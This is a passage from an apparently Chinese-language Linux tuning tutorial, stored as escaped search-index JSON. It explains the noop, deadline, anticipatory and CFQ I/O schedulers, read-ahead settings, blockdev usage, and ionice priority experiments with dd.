\u88ab\u4ece\u5185\u6838\u4e2d\u79fb\u9664\uff0c\u56e0\u4e3a\u53ef\u4ee5\u901a\u8fc7\u8c03\u6574\u5176\u4ed6\u8c03\u5ea6\u5668\uff08\u5982 CFQ\uff09\u6765\u5b9e\u73b0\u4e0e\u5176\u76f8\u4f3c\u7684\u529f\u80fd\u3002 \u67e5\u770b\u548c\u8bbe\u7f6eIO\u8c03\u5ea6\u7b97\u6cd5 \u67e5\u770b [root@tuning ~]# cat /sys/block/sda/queue/scheduler noop anticipatory deadline [cfq] \u5e26\u4e2d\u62ec\u53f7\u7684\u5c31\u662f\u5f53\u524d\u7684\u8c03\u5ea6\u7b97\u6cd5 \u4e34\u65f6\u4fee\u6539 [root@tuning ~]# echo deadline > /sys/block/sda/queue/scheduler [root@tuning ~]# cat /sys/block/sda/queue/scheduler noop anticipatory [deadline] cfq \u6c38\u4e45\u4fee\u6539\u8c03\u5ea6\u7b97\u6cd5 \u4fee\u6539\u5185\u6838\u53c2\u6570\uff0c\u52a0\u4e0aelevator=\u8c03\u5ea6\u7b97\u6cd5\u7684\u540d\u5b57 [root@tuning ~]$ /boot/grub/grub.conf kernel /vmlinuz-2.6.32-642.el6.x86_64 ro root=UUID=b4ae497b-f17c-4e10-9680-ae73fd033824 vga=791 elevator=deadline #vga=791 \uff1a \u5206\u8fa8\u7387 1024*768 [root@tuning ~]$ reboot [root@tuning ~]$ cat /sys/block/sda/queue/scheduler noop anticipatory [deadline] cfq \u8c03\u5ea6\u7b97\u6cd5\u7684\u53c2\u6570 \u9002\u5408\u6240\u6709\u8c03\u5ea6\u7b97\u6cd5\u7684\u53c2\u6570 [root@tuning ~]# ls /sys/block/sda/queue/ a\u3001\u961f\u5217\u7684\u957f\u5ea6 nr_requests [root@tuning ~]# cd /sys/block/sda/queue/ [root@tuning queue]# cat nr_requests 128 \u5373128\u4e2a\u8bf7\u6c42 b\u3001read-ahead \u9884\u8bfb b\u3001read-ahead \u9884\u8bfb Linux \u628a\u8bfb\u6a21\u5f0f\u5206\u4e3a\u968f\u673a\u8bfb\u548c\u987a\u5e8f\u8bfb\u4e24\u5927\u7c7b\uff0c\u5e76\u53ea\u5bf9\u987a\u5e8f\u8bfb\u8fdb\u884c\u9884\u8bfb\u3002\u8fd9\u4e00\u539f\u5219\u76f8\u5bf9\u4fdd\u5b88\uff0c\u4f46\u662f\u53ef\u4ee5\u4fdd\u8bc1\u5f88\u9ad8\u7684\u9884\u8bfb\u547d\u4e2d\u7387\u3002 \u4e3a\u4e86\u4fdd\u8bc1\u9884\u8bfb\u547d\u4e2d\u7387\uff0cLinux\u53ea\u5bf9\u987a\u5e8f\u8bfb (sequential read) \u8fdb\u884c\u9884\u8bfb\u3002\u5185\u6838\u901a\u8fc7\u9a8c\u8bc1\u5982\u4e0b\u4e24\u4e2a\u6761\u4ef6\u6765\u5224\u5b9a\u4e00\u4e2a read() \u662f\u5426\u987a\u5e8f\u8bfb\uff1a \u8fd9\u662f\u6587\u4ef6\u88ab\u6253\u5f00\u540e\u7684\u7b2c\u4e00\u6b21\u8bfb\uff0c\u5e76\u4e14\u8bfb\u7684\u662f\u6587\u4ef6\u9996\u90e8\uff1b \u5f53\u524d\u7684\u8bfb\u8bf7\u6c42\u4e0e\u524d\u4e00\uff08\u8bb0\u5f55\u7684\uff09\u8bfb\u8bf7\u6c42\u5728\u6587\u4ef6\u5185\u7684\u4f4d\u7f6e\u662f\u8fde\u7eed\u7684\u3002 \u5982\u679c\u4e0d\u6ee1\u8db3\u4e0a\u8ff0\u987a\u5e8f\u6027\u6761\u4ef6\uff0c\u5c31\u5224\u5b9a\u4e3a\u968f\u673a\u8bfb\u3002\u4efb\u4f55\u4e00\u4e2a\u968f\u673a\u8bfb\u90fd\u5c06\u7ec8\u6b62\u5f53\u524d\u7684\u987a\u5e8f\u5e8f\u5217\uff0c\u4ece\u800c\u7ec8\u6b62\u9884\u8bfb\u884c\u4e3a\uff08\u800c\u4e0d\u662f\u7f29\u51cf\u9884\u8bfb\u5927\u5c0f\uff09\u3002 \u9884\u8bfb\u7a97\u53e3 Linux\u91c7\u7528\u4e86\u4e00\u4e2a\u5feb\u901f\u7684\u7a97\u53e3\u6269\u5f20\u8fc7\u7a0b \u2022 \u9996\u6b21\u9884\u8bfb\uff1a readahead_size = read_size * 2 // or *4 \u9884\u8bfb\u7a97\u53e3\u7684\u521d\u59cb\u503c\u662f\u8bfb\u5927\u5c0f\u7684\u4e8c\u5230\u56db\u500d\u3002\u8fd9\u610f\u5473\u7740\u5728\u60a8\u7684\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u8f83\u5927\u7684\u8bfb\u7c92\u5ea6\uff08\u6bd4\u598232KB\uff09\u53ef\u4ee5\u7a0d\u7a0d\u63d0\u5347I/O\u6548\u7387\u3002 \u2022 \u540e\u7eed\u9884\u8bfb\uff1areadahead_size *= 2 \u540e\u7eed\u7684\u9884\u8bfb\u7a97\u53e3\u5c06\u9010\u6b21\u500d\u589e\uff0c\u76f4\u5230\u8fbe\u5230\u7cfb\u7edf\u8bbe\u5b9a\u7684\u6700\u5927\u9884\u8bfb\u5927\u5c0f\uff0c\u5176\u7f3a\u7701\u503c\u662f 256KB \u67e5\u770b\u548c\u4fee\u6539\u9884\u8bfb\u7a97\u53e3 $ blockdev --getra device \u662f/sys/block/$device/queue/read_ahead_kb \u7684\u4e8c\u500d $ blockdev --setra N device \u6216\u8005\u76f4\u63a5\u4fee\u6539\u7cfb\u7edf\u53c2\u6570 [root@tuning queue]# echo 4096 > /sys/block/sda/queue/read_ahead_kb [root@tuning queue]# cat /sys/block/sda/queue/read_ahead_kb //\u5176\u503c\u8c03\u62100\uff0c\u5173\u95ed\u4e86\u9884\u8bfb\u673a\u5236\u3002 4096 [root@tuning queue]# blockdev --getra /dev/sda 8192 blockdev\u547d\u4ee4 [root@localhost ~]# blockdev \u7528\u6cd5\uff1a blockdev -V blockdev --report [\u8bbe\u5907] blockdev [-v|-q] \u547d\u4ee4 \u8bbe\u5907 \u53ef\u7528\u547d\u4ee4\u6709\uff1a --getsz \u83b7\u5f97 512-\u5b57\u8282\u6247\u533a\u7684\u5927\u5c0f --setro \u8bbe\u7f6e\u53ea\u8bfb --setrw \u8bbe\u7f6e\u8bfb\u5199 --getro \u83b7\u5f97\u53ea\u8bfb --getdiscardzeroes \u83b7\u53d6 \u5ffd\u7565\u96f6\u6570\u636e \u652f\u6301\u72b6\u6001 --getss \u83b7\u5f97\u903b\u8f91\u5757(\u6247\u533a)\u5927\u5c0f --getpbsz \u83b7\u5f97\u7269\u7406\u5757(\u6247\u533a)\u5927\u5c0f --getiomin \u83b7\u5f97\u6700\u5c0f I/O \u5927\u5c0f --getioopt \u83b7\u5f97\u6700\u4f18 I/O \u5927\u5c0f --getalignoff \u83b7\u5f97\u5bf9\u9f50\u504f\u79fb\u5b57\u8282\u6570 --getmaxsect \u83b7\u5f97\u6bcf\u6b21\u8bf7\u6c42\u7684\u6700\u5927\u6247\u533a\u6570 --getbsz \u83b7\u5f97\u5757\u5927\u5c0f --setbsz <bytes> set blocksize on file descriptor opening the block device --getsize \u83b7\u5f97 32-bit \u6247\u533a\u6570\u91cf(\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528 --getsz) --getsize64 \u83b7\u5f97\u5b57\u8282\u5927\u5c0f --setra <sectors> \u8bbe\u7f6e readahead --getra \u83b7\u53d6 readahead --setfra <sectors> \u8bbe\u7f6e\u6587\u4ef6\u7cfb\u7edf readahead --getfra \u83b7\u53d6\u6587\u4ef6\u7cfb\u7edf readahead --flushbufs \u5237\u65b0\u7f13\u5b58 --rereadpt \u91cd\u65b0\u8bfb\u53d6\u5206\u533a\u8868 \u200b \u200b \u5404\u4e2a\u8c03\u5ea6\u7b97\u6cd5\u7684\u53c2\u6570 Deadline\u53c2\u6570 /sys/block//queue/iosched/writes_starved \u8fdb\u884c\u4e00\u4e2a\u5199\u64cd\u4f5c\u4e4b\u524d\uff0c\u5141\u8bb8\u8fdb\u884c\u591a\u5c11\u6b21\u8bfb\u64cd\u4f5c /sys/block//queue/iosched/read_expire \u8bfb\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4 /sys/block//queue/iosched/read_expire \u5199\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a 500ms /sys/block/sda/queue/iosched/front_merges \u662f\u5426\u8fdb\u884c\u524d\u5408\u5e76 Anticipatory\u53c2\u6570 /sys/block//queue/iosched/antic_expire \u9884\u6d4b\u7b49\u5f85\u65f6\u957f\uff0c\u9ed8\u8ba4\u4e3a 6ms /sys/block//queue/iosched/{write_expire,read_expire} \u8bfb\u5199\u8bf7\u6c42\u7684\u8d85\u65f6\u65f6\u957f /sys/block//queue/iosched/{write_batch_expire,read_batch_expire} \u8bfb\u5199\u7684\u6279\u91cf\u5904\u7406\u65f6\u957f CFQ\u53c2\u6570 /sys/block//queue/iosched/slice_idle \u5f53\u4e00\u4e2a\u8fdb\u7a0b\u7684\u961f\u5217\u88ab\u5206\u914d\u5230\u65f6\u95f4\u7247\u5374\u6ca1\u6709 IO \u8bf7\u6c42\u65f6\uff0c\u8c03\u5ea6\u5668\u5728\u8f6e\u8be2\u81f3\u4e0b\u4e00\u4e2a\u961f\u5217\u4e4b\u524d\u7684\u7b49\u5f85\u65f6\u95f4\uff0c\u4ee5\u63d0\u5347 IO \u7684\u5c40\u90e8\u6027\uff0c\u5bf9\u4e8e SSD \u8bbe\u5907\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u503c\u8bbe\u4e3a 0\u3002 /sys/block//queue/iosched/quantum \u4e00\u4e2a\u8fdb\u7a0b\u7684\u961f\u5217\u6bcf\u6b21\u88ab\u5904\u7406 IO \u8bf7\u6c42\u7684\u6700\u5927\u6570\u91cf\uff0c\u9ed8\u8ba4\u4e3a 4\uff0cRHEL6 \u4e3a 8\uff0c\u589e\u5927\u8fd9\u4e2a\u503c\u53ef\u4ee5\u63d0\u5347\u5e76\u884c\u5904\u7406 IO \u7684\u6027\u80fd\uff0c\u4f46\u53ef\u80fd\u4f1a\u9020\u6210\u67d0\u4e9b IO \u5ef6\u8fdf\u95ee\u9898\u3002 /sys/block//queue/iosched/slice_async_rq \u4e00\u6b21\u5904\u7406\u5199\u8bf7\u6c42\u7684\u6700\u5927\u6570 /sys/block//queue/iosched/low_latency \u5982\u679cIO\u5ef6\u8fdf\u7684\u95ee\u9898\u5f88\u4e25\u91cd\uff0c\u5c06\u8fd9\u4e2a\u503c\u8bbe\u4e3a 1 CFQ \u7684\u8fdb\u7a0b IO \u4f18\u5148\u7ea7\u548c\u8fdb\u7a0b CPU \u4f18\u5148\u7ea7\u662f\u72ec\u7acb\u7684\u3002\u4f7f\u7528 ionice \u8c03\u6574\u8fdb\u7a0b\u4f18\u5148\u7ea7\uff0c\u6709\u4e09\u79cd\u8c03\u5ea6\u7c7b\u578b\u53ef\u4ee5\u9009\u62e9 \u57fa\u4e8e\u5206\u7c7b\uff0c\u4f18\u5148\u7ea7\u961f\u5217 Class1(RTreal-time)\uff1a\u5b9e\u65f6 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Real time \u8fd9\u4e2a\u8c03\u5ea6\u7ea7\u522b\u7684\u8fdb\u7a0b\u4ea7\u751f\u7684IO\u88ab\u4f18\u5148\u5904\u7406\uff0c\u8fd9\u4e2a\u8c03\u5ea6\u7c7b\u578b\u5e94\u5c0f\u5fc3\u4f7f\u7528\uff0c\u9632\u6b62\u997f\u6b7b\u5176\u4ed6\u8fdb\u7a0bIO, \u5b83\u4e5f\u67098\u4e2a\u4f18\u5148\u7ea7\uff0c\u6570\u5b57\u8d8a\u5927\u5206\u7684\u7684IO\u65f6\u95f4\u7247\u8d8a\u957f Class2(BE best-effort): \u6700\u4f73\u6548\u679c\uff0c\u90fd\u80fd\u8bbf\u95ee \u9ed8\u8ba4 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Best-effort \u8fd9\u4e2a\u7c7b\u578b\u5171\u6709 8 \u4e2a\u4f18\u5148\u7ea7\uff0c\u5206\u522b\u4e3a 0-7\uff0c\u6570\u5b57\u8d8a\u4f4e\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u76f8\u540c\u7ea7\u522b\u7684\u4f18\u5148\u7ea7\u4f7f\u7528\u8f6e\u8be2\u7684\u65b9\u5f0f\u5904\u7406\u3002\u9002\u7528\u4e8e\u666e\u901a\u7684\u8fdb\u7a0b\u3002 \u57282.6.26\u4e4b\u524d\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u4f7f\u7528\"none\" \u8c03\u5ea6\u7c7b\u578b\uff0cIO\u8c03\u5ea6\u5668\u5c06\u5176\u89c6\u4f5cBest-effort\u8fdb\u884c\u5904\u7406\uff0c\u8fd9\u4e2a\u7c7b\u522b\u4e2d\u8fdb\u7a0b\u4f18\u5148\u7ea7\u7531CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u5f97\u6765\uff1aio_priority = (cpu_nice + 20) / 5 2.6.26\u4e4b\u540e\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u5c06\u4eceCPU\u8c03\u5ea6\u7c7b\u578b\u7ee7\u627f\u800c\u6765\uff0c\u8fd9\u4e2a\u7c7b\u522b\u7684\u4f18\u5148\u7ea7\u4ecd\u6309\u7167CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u800c\u6765\uff1aio_priority = (cpu_nice + 20) / 5 Class3(idle)\uff1a\u7a7a\u95f2 idle \u53ea\u6709\u5728\u6ca1\u6709\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u4ea7\u751f IO \u65f6\uff0cidle \u624d\u53ef\u4ee5\u4f7f\u7528\u78c1\u76d8 IO\uff0c\u9002\u7528\u4e8e\u54ea\u4e9b\u4e0d\u91cd\u8981\u7684\u7a0b\u5e8f\uff08\u5982 updatedb\uff09\uff0c\u8ba9\u5b83\u4eec\u5728\u78c1\u76d8\u7a7a\u95f2\u65f6\u518d\u4ea7\u751f IO \u5728cfq\u8c03\u5ea6\u7b97\u6cd5\u4e0b\uff0cionice \u7528\u4e8e\u8bbe\u7f6e\u6216\u66f4\u6539\u5206\u7c7b # ionice -p PID # ionice -c3 -p PID # ionice -c1 -n0 dd if=/dev/sda of=/dev/null \u5b9e\u9a8c\u4e00\uff1a 1\u3001\u5148\u51c6\u5907\u4e09\u4e2a\u6587\u4ef6 [root@tuning iosched]# dd if=/dev/zero of=/bigfile1 bs=1M count=1000 [root@tuning iosched]# dd if=/dev/zero of=/bigfile2 bs=1M count=1000 [root@tuning iosched]# dd if=/dev/zero of=/bigfile3 bs=1M count=1000 [root@tuning iosched]# iotop rt: real time be\uff1a best-effort idle: idle [root@tuning ~]# echo 3 > /proc/sys/vm/drop_caches [root@tuning ~]# free -m \u7ec8\u7aef\u4e00\uff1a\u770b\u8c01\u4f7f\u7528\u78c1\u76d8 [root@tuning iosched]# iotop [root@tuning ~]# useradd user1 [root@tuning ~]# useradd user2 [root@tuning ~]# useradd user3 \u7ec8\u7aef\u4e8c\uff1a\u7528user1 \u2014\u2014 C3\u6ca1\u6709\u5b50\u4f18\u5148\u7ea7 [user1@tuning ~]$ time ionice -c3 dd if=/bigfile3 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 26.8628 s, 39.0 MB/s real 0m26.969s user 0m0.295s sys 0m5.140s \u7ec8\u7aef\u4e09\uff1a\u7528user2 \u2014\u2014 C2\u9ed8\u8ba4\uff0c\u53ef\u4ee5\u4e0d\u5199\uff0c\u9ed8\u8ba4\u5b50\u4f18\u5148\u7ea7\u662f4 [root@tuning ~]# su - user2 [user2@tuning ~]$ time ionice -c2 dd if=/bigfile2 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 15.5757 s, 67.3 MB/s real 0m15.609s user 0m0.167s sys 0m7.785s \u7ec8\u7aef\u56db\uff1aroot \u2014\u2014 //\u9ed8\u8ba4\u5b50\u4f18\u5148\u7ea7\u4e3a4\uff0cc1\u5f3a\u52bf [root@tuning ~]# time ionice -c1 dd if=/bigfile1 of=/dev/null real 0m12.610s user 0m0.252s sys 0m8.938s \u5b9e\u9a8c\u4e8c\uff1a\u5206\u7c7b\u76f8\u540c\uff0c\u4f18\u5148\u7ea7\u4e0d\u540c 0~7 \u7ec8\u7aef\u4e8c\uff1a [user1@tuning ~]$ time ionice -c2 -n0 dd if=/bigfile3 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 15.5433 s, 67.5 MB/s real 0m15.616s user 0m0.159s sys 0m6.947s \u7ec8\u7aef\u4e09\uff1a [user2@tuning ~]$ time ionice -c2 -n7 dd if=/bigfile2 of=/dev/null [user2@tuning ~]$ time ionice -c2 -n7 dd if=/bigfile2 of=/dev/null 2048000+0 records in 2048000+0 records out 1048576000 bytes (1.0 GB) copied, 23.3753 s, 44.9 MB/s real 0m23.399s user 0m0.258s sys 0m7.202s \u5b9e\u9a8c\u4e09\uff1a\u8c03\u6574\u5df2\u7ecf\u8fd0\u884c\u7684\u8fdb\u7a0b\u7684io\u8c03\u5ea6\u7b97\u6cd5\u5206\u7c7b\u53ca\u4f18\u5148\u7ea7\u7b49 \u6807\u7b7e\u4e00\uff1a [root@tuning ~]# dd if=/dev/zero of=/testfile \u6807\u7b7e\u4e8c\uff1a [root@tuning iosched]# iotop \u6807\u7b7e\u4e09\uff1a [root@tuning ~]# ps -ef | grep dd root 3028 2230 31 16:51 pts/3 00:00:09 dd if=/dev/zero of=/testfile root 3033 2229 0 16:51 pts/1 00:00:00 grep dd [root@tuning ~]# ionice -c3 -p 3028","title":"IO scheduler"},{"location":"system/linux/IO/IO%20scheduler/#io","text":"","title":"I/O\u8c03\u5ea6\u7b97\u6cd5"},{"location":"system/linux/IO/IO%20scheduler/#complete-fair-queuingcfq-fairness-oriented","text":"Note CFQ \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u4e00\u4e2a I/O \u8bf7\u6c42\u961f\u5217\uff0c\u5728\u6bcf\u4e2a\u961f\u5217\u7684\u5185\u90e8\uff0c\u8fdb\u884c\u5408\u5e76\u548c\u6392\u5e8f\u7684\u4f18\u5316\u3002CFQ \u4ee5\u8f6e\u8be2\u7684\u65b9\u5f0f\u5904\u7406\u8fd9\u4e9b\u961f\u5217\uff0c\u6bcf\u6b21\u4ece\u4e00\u4e2a\u961f\u5217\u4e2d\u5904\u7406\u7279\u5b9a\u6570\u91cf\u7684\u8bf7\u6c42\uff08\u9ed8\u8ba4\u4e3a 4 \u4e2a\uff09\u3002\u5b83\u8bd5\u56fe\u5c06 I/O \u5e26\u5bbd\u5747\u5300\u7684\u5206\u914d\u81f3\u6bcf\u4e2a\u8fdb\u7a0b\u3002CFQ \u539f\u672c\u9488\u5bf9\u7684\u662f\u591a\u5a92\u4f53\u6216\u684c\u9762\u5e94\u7528\u573a\u666f\uff0c\u7136\u800c\uff0cCFQ \u5176\u5b9e\u5728\u8bb8\u591a\u573a\u666f\u4e2d\u5185\u8868\u73b0\u7684\u5f88\u597d\u3002CFQ \u5bf9\u6bcf\u4e00\u4e2a IO \u8bf7\u6c42\u90fd\u662f\u516c\u5e73\u7684\u3002\u8fd9\u4f7f\u5f97 CFQ \u5f88\u9002\u5408\u79bb\u6563\u8bfb\u7684\u5e94\u7528 (eg: OLTP DB)\u3002\u591a\u6570\u4f01\u4e1a\u53d1\u578b\u7248\u9009\u62e9 CFQ \u4f5c\u4e3a\u9ed8\u8ba4\u7684 I/O \u8c03\u5ea6\u5668\u3002","title":"Complete Fair Queuing\uff08CFQ\uff09- fairness-oriented"},{"location":"system/linux/IO/IO%20scheduler/#deadline-latency-oriented","text":"Note Deadline \u8c03\u5ea6\u5668\u662f\u8bbe\u8ba1\u7528\u6765\u89e3\u51b3 Linus Elevator \u5bfc\u81f4\u7684 I/O \u997f\u6b7b\u7684\u95ee\u9898\u3002\u5bf9\u78c1\u76d8\u4e0a\u67d0\u4e2a\u533a\u57df\u7684\u5927\u91cf\u8bf7\u6c42\uff0c\u4f1a\u65e0\u9650\u671f\u7684\u997f\u6b7b (starvation) \u5bf9\u78c1\u76d8\u5176\u4ed6\u533a\u57df\u4e0a\u7684\u8bf7\u6c42\u3002\u8bf7\u6c42\u997f\u6b7b\u7684\u4e00\u4e2a\u7279\u4f8b\u662f \u5199\u8bf7\u6c42\u997f\u6b7b\u8bfb\u8bf7\u6c42 (writes starving reads)\uff0c\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5f53\u9700\u8981\u8fdb\u884c\u5199\u64cd\u4f5c\u65f6\uff0c\u7531\u4e8e\u9700\u8981\u5199\u7684\u6570\u636e\u5728\u5185\u5b58\u7684 page cache \u4e2d\uff0c\u8fdb\u7a0b\u662f\u9700\u8981\u4fee\u6539\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u5411\u5185\u6838\u53d1\u9001\u5199\u8bf7\u6c42\u5373\u53ef\uff0c\u4e4b\u540e\u8fdb\u7a0b\u53ef\u4ee5\u53bb\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u7531\u5185\u6838\u8d1f\u8d23\u5c06\u6570\u636e\u540c\u6b65\u81f3\u78c1\u76d8\u4e2d\u5373\u53ef\u3002\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5199\u8bf7\u6c42\u662f\u5f02\u6b65\u64cd\u4f5c\u3002\u800c\u8bfb\u64cd\u4f5c\u662f\u5b8c\u5168\u4e0d\u540c\u7684\uff0c\u5f53\u8fdb\u7a0b\u9700\u8981\u8bfb\u53d6\u6570\u636e\u65f6\uff0c\u9700\u8981\u5411\u5185\u6838\u53d1\u9001\u8bfb\u8bf7\u6c42\uff0c\u5185\u6838\u5c06\u6570\u636e\u8f7d\u5165\u5230\u5185\u5b58\u4e2d\uff0c\u7531\u4e8e\u8fdb\u7a0b\u5f80\u5f80\u9700\u8981\u5904\u7406\u8bfb\u53d6\u7684\u6570\u636e\uff0c\u56e0\u6b64\u8fdb\u7a0b\u5c06\u5904\u4e8e\u963b\u585e\u72b6\u6001\uff0c\u76f4\u5230\u8bf7\u6c42\u88ab\u5904\u7406\u5b8c\u6210\u3002\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\uff0c\u8bfb\u8bf7\u6c42\u662f\u540c\u6b65\u7684\u64cd\u4f5c\u3002\u5199\u8bf7\u6c42\u5ef6\u8fdf\u5bf9\u7cfb\u7edf\u7684\u6027\u80fd\u5f71\u54cd\u4e0d\u5927\uff0c\u800c\u8bfb\u8bf7\u6c42\u5ef6\u8fdf\u5bf9\u7cfb\u7edf\u6027\u80fd\u5f71\u54cd\u662f\u975e\u5e38\u5927\u7684\uff0c\u56e0\u6b64\u4e24\u79cd IO \u8bf7\u6c42\u9700\u8981\u533a\u522b\u5bf9\u5f85\u3002 Dealine \u8c03\u5ea6\u5668\u4e13\u95e8\u9488\u5bf9\u8bfb\u8bf7\u6c42\u5ef6\u8fdf\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u5728 deadline \u7b97\u6cd5\u4e2d\uff0c\u6bcf\u4e00\u4e2a\u8bf7\u6c42\u90fd\u6709\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8bfb\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\u662f 500ms\uff0c\u5199\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\u662f 5s\u3002Dealine \u8c03\u5ea6\u5668\u4e5f\u4f1a\u5bf9\u8bf7\u6c42\u961f\u5217\u8fdb\u884c\u5408\u5e76\u548c\u6392\u5e8f\u64cd\u4f5c\uff0c\u8fd9\u4e2a\u961f\u5217\u79f0\u4f5c\u6392\u5e8f\u961f\u5217\uff08sorted queue\uff09\u3002\u5f53\u65b0\u8bf7\u6c42\u88ab\u63d0\u4ea4\uff0cDeadline\u5c06\u5176\u52a0\u5165\u5230\u6392\u5e8f\u961f\u5217\u4e2d\u8fdb\u884c\u5408\u5e76\u548c\u6392\u5e8f\u3002\u540c\u65f6 Deadline \u5c06\u8fd9\u4e2a\u8bf7\u6c42\u52a0\u5165\u5230\u7b2c\u4e8c\u79cd\u7c7b\u578b\u7684\u961f\u5217\u4e2d\uff0c\u8bfb\u8bf7\u6c42\u88ab\u52a0\u5165\u81f3\u8bfbFIFO\u961f\u5217 (Read FIFO queue)\uff0c\u5199\u8bf7\u6c42\u88ab\u52a0\u5165\u5230\u5199FIFO\u961f\u5217 (Write FIFO queue)\uff0c\u8fd9\u4e24\u4e2a\u961f\u5217\u4e2d\uff0c\u8bf7\u6c42\u5b8c\u5168\u6309\u7167 FIFO \u987a\u5e8f\u6392\u5217\uff0c\u5373\u65b0\u8bf7\u6c42\u6c38\u8fdc\u88ab\u653e\u5165\u5230\u961f\u5217\u7684\u672b\u5c3e\u3002\u8fd9\u6837\u4e00\u6765 Dealine \u5c31\u7ef4\u62a4\u4e09\u4e2a\u961f\u5217\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0cDeadline \u5c06\u6392\u5e8f\u961f\u5217\u4e2d\u7684\u8bf7\u6c42\u653e\u5165\u5230\u8c03\u5ea6\u961f\u5217 (dispatch queue\uff0c\u5373\u5c06\u5199\u5165\u78c1\u76d8\u7684\u961f\u5217)\u4e2d\uff0c\u8c03\u5ea6\u961f\u5217\u628a\u8bf7\u6c42\u53d1\u9001\u81f3\u78c1\u76d8\u9a71\u52a8\u3002\u5982\u679c\u5199 FIFO \u961f\u5217\u6216\u8bfb FIFO \u961f\u5217\u4e2d\u7684\u8bf7\u6c42\u53d1\u751f\u4e86\u8d85\u65f6\uff0cDeadline \u8c03\u5ea6\u5668\u5c31\u4e0d\u518d\u4f7f\u7528\u6392\u5e8f\u961f\u5217\uff0c\u800c\u662f\u5f00\u59cb\u5c06\u53d1\u751f\u8d85\u65f6\u7684 FIFO \u961f\u5217\u7684\u8bf7\u6c42\u653e\u5165\u8c03\u5ea6\u961f\u5217\uff0c\u76f4\u81f3\u961f\u5217\u4e2d\u6ca1\u6709\u8d85\u65f6\u7684\u8bf7\u6c42\uff0cDeadline \u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u5f0f\u4fdd\u8bc1\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u4e0d\u4f1a\u957f\u65f6\u95f4\u8d85\u65f6\u3002 Deadling \u9632\u6b62\u4e86\u8bf7\u6c42\u997f\u6b7b\u7684\u51fa\u73b0\uff0c\u7531\u4e8e\u8bfb\u8bf7\u6c42\u7684\u8d85\u65f6\u65f6\u95f4\u8fdc\u5c0f\u4e8e\u5199\u8bf7\u6c42\uff0c\u5b83\u540c\u65f6\u4e5f\u907f\u514d\u4e86\u51fa\u73b0\u5199\u8bf7\u6c42\u997f\u6b7b\u8bfb\u8bf7\u6c42\u3002 Deadline \u6bd4\u8f83\u9002\u5408\u4e8eMySQL\u6570\u636e\u5e93\u3002 deadline\uff08\u622a\u6b62\u65f6\u95f4\u8c03\u5ea6\u7a0b\u5e8f\uff09 \u6700\u540e\u671f\u9650\uff0c\u9884\u671f\u7684\u65f6\u95f4\u5fc5\u987b\u5b8c\u6210\u3002\u5177\u6709\u5b9e\u65f6\u6027\uff0c \u5f53\u6709\u4e00\u4e2aI/O\u8bf7\u6c42\uff0c\u4e00\u5b9a\u4f1a\u5728\u6307\u5b9a\u65f6\u95f4\u59825ms\u4e4b\u5185\u5b8c\u6210\u3002 \u4f5c\u4e3a\u865a\u62df\u673a\u7684\u7269\u7406\u673a(virtualization host)\uff0c\u4f7f\u7528deadline\u53ef\u4ee5\u8ba9\u6240\u6709\u7684\u865a\u62df\u673a\u5f97\u5230I/O\u8bf7\u6c42\u3002","title":"Deadline - latency-oriented"},{"location":"system/linux/IO/IO%20scheduler/#noopno-operation","text":"Note \u8be5\u7b97\u6cd5\u5b9e\u73b0\u4e86\u6700\u7b80\u5355\u7684 FIFO \u961f\u5217\uff0c\u6240\u6709 IO \u8bf7\u6c42\u6309\u7167\u5927\u81f4\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u64cd\u4f5c\u3002\u4e4b\u6240\u4ee5\u8bf4\u300c\u5927\u81f4\u300d\uff0c\u539f\u56e0\u662f NOOP \u5728 FIFO \u7684\u57fa\u7840\u4e0a\u8fd8\u505a\u4e86\u76f8\u90bb IO \u8bf7\u6c42\u7684\u5408\u5e76\uff0c\u4f46\u5176\u4e0d\u4f1a\u8fdb\u884c\u6392\u5e8f\u64cd\u4f5c\u3002 NOOP \u9002\u7528\u4e8e\u5e95\u5c42\u786c\u4ef6\u81ea\u8eab\u5c31\u5177\u6709\u5f88\u5f3a\u8c03\u5ea6\u63a7\u5236\u5668\u7684\u5757\u8bbe\u5907\uff08\u5982\u67d0\u4e9bSAN\u8bbe\u5907\uff09\uff0c\u6216\u8005\u5b8c\u5168\u968f\u673a\u8bbf\u95ee\u7684\u5757\u8bbe\u5907\uff08\u5982SSD\uff09\u3002 